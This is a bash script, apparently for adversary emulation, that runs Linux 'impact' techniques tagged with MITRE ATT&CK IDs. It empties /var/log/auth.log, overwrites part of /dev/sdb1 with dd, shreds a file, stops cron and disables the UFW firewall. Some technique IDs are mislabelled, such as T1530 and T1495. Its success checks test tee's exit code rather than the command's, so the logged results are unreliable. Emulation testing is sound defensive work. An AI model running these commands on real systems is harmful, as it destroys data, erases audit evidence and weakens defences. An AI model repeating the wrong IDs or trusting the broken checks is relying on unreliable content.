#!/bin/bash

# Ensure output directory exists
OUTPUT_DIR="Linux_output/Impact"
mkdir -p "$OUTPUT_DIR"
OUTPUT_FILE="$OUTPUT_DIR/Output.txt"

# Redirect stderr to stdout to capture all output
exec 2>&1

# Start script execution
echo "Starting comprehensive Linux script at $(date)" | tee -a "$OUTPUT_FILE"

# Test 1: T1530 - Data Destruction with shred
echo "============================================================" | tee -a "$OUTPUT_FILE"
echo "Technique ID: T1530 - Data Destruction Using shred" | tee -a "$OUTPUT_FILE"
echo "============================================================" | tee -a "$OUTPUT_FILE"

TARGET_FILE="${PWD}/todelete.txt"
echo "Creating a sample file for destruction: $TARGET_FILE" | tee -a "$OUTPUT_FILE"
echo "This is a sample file that will be destroyed." > "$TARGET_FILE"

echo "Destroying file using shred..." | tee -a "$OUTPUT_FILE"
shred -u "$TARGET_FILE" 2>&1 | tee -a "$OUTPUT_FILE"
if [ $? -eq 0 ]; then
  echo "File destroyed successfully." | tee -a "$OUTPUT_FILE"
else
  echo "Error: Failed to destroy file using shred." | tee -a "$OUTPUT_FILE"
  exit 1
fi

# Test 2: T1489 - Service Stop
echo "============================================================" | tee -a "$OUTPUT_FILE"
echo "Technique ID: T1489 - Service Stop" | tee -a "$OUTPUT_FILE"
echo "============================================================" | tee -a "$OUTPUT_FILE"

SERVICE_NAME="cron"
echo "Stopping $SERVICE_NAME service..." | tee -a "$OUTPUT_FILE"
systemctl stop "$SERVICE_NAME" 2>&1 | tee -a "$OUTPUT_FILE"
if [ $? -eq 0 ]; then
  echo "$SERVICE_NAME service stopped successfully." | tee -a "$OUTPUT_FILE"
else
  echo "Error: Failed to stop $SERVICE_NAME service." | tee -a "$OUTPUT_FILE"
  exit 1
fi

echo "Starting $SERVICE_NAME service..." | tee -a "$OUTPUT_FILE"
systemctl start "$SERVICE_NAME" 2>&1 | tee -a "$OUTPUT_FILE"
if [ $? -eq 0 ]; then
  echo "$SERVICE_NAME service started successfully." | tee -a "$OUTPUT_FILE"
else
  echo "Error: Failed to start $SERVICE_NAME service." | tee -a "$OUTPUT_FILE"
  exit 1
fi

# Test 3: T1495 - Resource Hijacking via CPU Stress
echo "============================================================" | tee -a "$OUTPUT_FILE"
echo "Technique ID: T1495 - Resource Hijacking Using CPU Stress" | tee -a "$OUTPUT_FILE"
echo "============================================================" | tee -a "$OUTPUT_FILE"

# Check if stress is installed, otherwise install it
if ! command -v stress &> /dev/null; then
  echo "stress command not found. Installing stress..." | tee -a "$OUTPUT_FILE"
  apt-get update && apt-get install -y stress
fi

echo "Starting CPU stress test..." | tee -a "$OUTPUT_FILE"
stress --cpu 4 --timeout 10 2>&1 | tee -a "$OUTPUT_FILE"
if [ $? -eq 0 ]; then
  echo "CPU stress test completed successfully." | tee -a "$OUTPUT_FILE"
else
  echo "Error: CPU stress test failed." | tee -a "$OUTPUT_FILE"
  exit 1
fi

# Test 4: T1070.004 - Clear System Logs
echo "============================================================" | tee -a "$OUTPUT_FILE"
echo "Technique ID: T1070.004 - Clear System Logs" | tee -a "$OUTPUT_FILE"
echo "============================================================" | tee -a "$OUTPUT_FILE"

LOG_FILE="/var/log/auth.log"
echo "Clearing system log file: $LOG_FILE" | tee -a "$OUTPUT_FILE"
cat /dev/null > "$LOG_FILE" 2>&1 | tee -a "$OUTPUT_FILE"
if [ $? -eq 0 ]; then
  echo "System log file cleared successfully." | tee -a "$OUTPUT_FILE"
else
  echo "Error: Failed to clear system log file." | tee -a "$OUTPUT_FILE"
  exit 1
fi

# Test 5: T1561.002 - Disk Wipe with dd
echo "============================================================" | tee -a "$OUTPUT_FILE"
echo "Technique ID: T1561.002 - Disk Wipe Using dd" | tee -a "$OUTPUT_FILE"
echo "============================================================" | tee -a "$OUTPUT_FILE"

WIPE_DISK="/dev/sdb1"  # Replace with an appropriate test disk
echo "Wiping disk $WIPE_DISK with dd..." | tee -a "$OUTPUT_FILE"
dd if=/dev/zero of="$WIPE_DISK" bs=1M count=10 2>&1 | tee -a "$OUTPUT_FILE"
if [ $? -eq 0 ]; then
  echo "Disk wiped successfully." | tee -a "$OUTPUT_FILE"
else
  echo "Error: Failed to wipe disk with dd." | tee -a "$OUTPUT_FILE"
  exit 1
fi

# Test 6: T1562.001 - Disable Security Tools (example: disable ufw)
echo "============================================================" | tee -a "$OUTPUT_FILE"
echo "Technique ID: T1562.001 - Disable Security Tools (UFW)" | tee -a "$OUTPUT_FILE"
echo "============================================================" | tee -a "$OUTPUT_FILE"

echo "Disabling UFW firewall..." | tee -a "$OUTPUT_FILE"
ufw disable 2>&1 | tee -a "$OUTPUT_FILE"
if [ $? -eq 0 ]; then
  echo "UFW firewall disabled successfully." | tee -a "$OUTPUT_FILE"
else
  echo "Error: Failed to disable UFW firewall." | tee -a "$OUTPUT_FILE"
  exit 1
fi

echo "Enabling UFW firewall..." | tee -a "$OUTPUT_FILE"
ufw enable 2>&1 | tee -a "$OUTPUT_FILE"
if [ $? -eq 0 ]; then
  echo "UFW firewall enabled successfully." | tee -a "$OUTPUT_FILE"
else
  echo "Error: Failed to enable UFW firewall." | tee -a "$OUTPUT_FILE"
  exit 1
fi

echo "Comprehensive Linux impact simulation script completed at $(date)" | tee -a "$OUTPUT_FILE"
